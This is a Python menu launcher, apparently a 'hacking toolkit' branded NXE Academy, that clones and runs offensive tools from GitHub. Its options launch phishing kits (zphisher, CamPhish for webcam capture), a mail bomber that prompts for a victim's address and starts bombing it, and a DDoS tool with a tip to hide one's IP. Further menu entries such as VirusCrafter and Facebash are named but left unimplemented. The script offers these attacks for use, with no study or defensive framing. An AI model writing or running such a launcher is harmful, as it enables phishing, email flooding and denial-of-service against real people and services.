import os
import subprocess
import time
import webbrowser

# Clear the screen
def clear_screen():
    os.system("clear" if os.name == "posix" else "cls")

# Display the banner
def display_banner():
    print("\033[31;40;1m")
    print("""
  ███╗   ██╗██╗  ██╗███████╗    █████╗  ██████╗ █████╗ ██████╗ ███████╗███╗   ███╗██╗   ██╗
  ████╗  ██║╚██╗██╔╝██╔════╝   ██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝████╗ ████║╚██╗ ██╔╝
  ██╔██╗ ██║ ╚███╔╝ █████╗     ███████║██║     ███████║██████╔╝█████╗  ██╔████╔██║ ╚████╔╝ 
  ██║╚██╗██║ ██╔██╗ ██╔══╝     ██╔══██║██║     ██╔══██║██╔══██╗██╔══╝  ██║╚██╔╝██║  ╚██╔╝  
  ██║ ╚████║██╔╝ ██╗███████╗   ██║  ██║╚██████╗██║  ██║██║  ██║███████╗██║ ╚═╝ ██║   ██║   
  ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝   ╚═╝   
\033[33;4mVersion:\033[0m 4            \033[33;4mCTRL+C:\033[0m exit          \033[33;4mAuthor:\033[0m NXE Academy
""")
    print("\033[0m")

# Display the menu
def display_menu():
    menu = """
\033[37m[1]\033[36m Requirements & Updates        \033[37m[2]\033[36m Phishing Tool				
\033[37m[3]\033[36m WebCam Hack                   \033[37m[4]\033[36m Subscan			
\033[37m[5]\033[36m Gmail Bomber		          \033[37m[6]\033[36m DDOS Attack			
\033[37m[7]\033[36m How to Use?	              \033[37m[8]\033[36m Uninstall Downloaded Tools		
\033[37m[9]\033[36m Ip Info	                  \033[37m[10]\033[36m Dorks-Eye
\033[37m[11]\033[36m HackerPro                    \033[37m[12]\033[36m RED_HAWK
\033[37m[13]\033[36m VirusCrafter                 \033[37m[14]\033[36m Info-Site
\033[37m[15]\033[36m BadMod	                  \033[37m[16]\033[36m Facebash
\033[37m[17]\033[36m DARKARMY                     \033[37m[18]\033[36m AUTO-IP-CHANGER
"""
    print(menu)

# Function to handle the user's choice
def handle_choice():
    islem = input("Enter the transaction number: ")
    if islem in ["1", "01"]:
        clear_screen()
        print("\033[47;31;5m Installing updates and requirements...\033[0m")
        time.sleep(5)
        subprocess.run(["pkg", "install", "git", "-y"])
        subprocess.run(["pkg", "install", "python", "python3", "-y"])
        subprocess.run(["pkg", "install", "pip", "pip3", "-y"])
        subprocess.run(["pkg", "install", "curl", "-y"])
        subprocess.run(["apt", "update"])
        subprocess.run(["apt", "upgrade", "-y"])
        print("\033[47;3;35m Update completed...\033[0m")
        time.sleep(3)
        os.system("python nxe_academy.py")

    elif islem in ["2", "02"]:
        clear_screen()
        print("\033[47;3;35m Installation may take some time...\033[0m")
        time.sleep(3)
        os.chdir("Tools")
        subprocess.run(["git", "clone", "https://github.com/htr-tech/zphisher"])
        os.chdir("zphisher")
        subprocess.run(["bash", "zphisher.sh"])

    elif islem in ["3", "03"]:
        clear_screen()
        print("\033[47;3;35m Installation may take some time...\033[0m")
        time.sleep(3)
        os.chdir("Tools")
        subprocess.run(["git", "clone", "https://github.com/techchipnet/CamPhish"])
        os.chdir("CamPhish")
        subprocess.run(["bash", "camphish.sh"])

    elif islem in ["4", "04"]:
        clear_screen()
        print("\033[47;3;35m Installation may take some time...\033[0m")
        time.sleep(3)
        os.chdir("Tools")
        subprocess.run(["git", "clone", "https://github.com/zidansec/subscan"])
        os.chdir("subscan")
        domain = input("Enter a domain (e.g., example.com): ")
        subprocess.run(["./subscan", domain])

    elif islem in ["5", "05"]:
        clear_screen()
        print("\033[47;3;35m Installation may take some time...\033[0m")
        time.sleep(3)
        os.chdir("Tools")
        subprocess.run(["git", "clone", "https://github.com/juzeon/fast-mail-bomber.git"])
        os.chdir("fast-mail-bomber")
        subprocess.run(["mv", "config.example.php", "config.php"])
        subprocess.run(["php", "index.php", "update-providers"])
        subprocess.run(["rm", "-rf", "data/nodes.json", "data/dead_providers.json"])
        print("\033[47;3;35m This installation may take a long time...\033[0m")
        print("\033[47;3;35m Press Ctrl+C to stop...\033[0m")
        time.sleep(4)
        subprocess.run(["php", "index.php", "update-nodes"])
        subprocess.run(["php", "index.php", "refine-nodes"])
        email = input("Enter an email address to bomb: ")
        subprocess.run(["php", "index.php", "start-bombing", email])

    elif islem in ["6", "06"]:
        clear_screen()
        print("\033[47;3;35m Installation may take some time...\033[0m")
        time.sleep(3)
        os.chdir("Tools")
        subprocess.run(["git", "clone", "https://github.com/palahsu/DDoS-Ripper.git"])
        os.chdir("DDoS-Ripper")
        subprocess.run(["python3", "DRipper.py"])
        print("\033[47;3;35m Hide your IP before using this tool...\033[0m")

    elif islem in ["7", "07"]:
        clear_screen()
        print("Discord server: https://discord.gg/ph5ahRQ8jC")
        webbrowser.open("https://discord.gg/ph5ahRQ8jC")
        time.sleep(10)
        print("Wait for 10 seconds...")
        os.system("python nxe_academy.py")

    elif islem in ["8", "08"]:
        clear_screen()
        print("\033[47;3;35m Removing downloaded tools...\033[0m")
        time.sleep(3)
        subprocess.run(["rm", "-rf", "Tools"])
        os.system("python nxe_academy.py")

    # Add other options similarly...

    else:
        clear_screen()
        print("\033[36;40;1m You entered an invalid code...\033[0m")
        time.sleep(1)
        os.system("python nxe_academy.py")

# Main function
def main():
    clear_screen()
    display_banner()
    display_menu()
    handle_choice()

# Run the script
if __name__ == "__main__":
    main()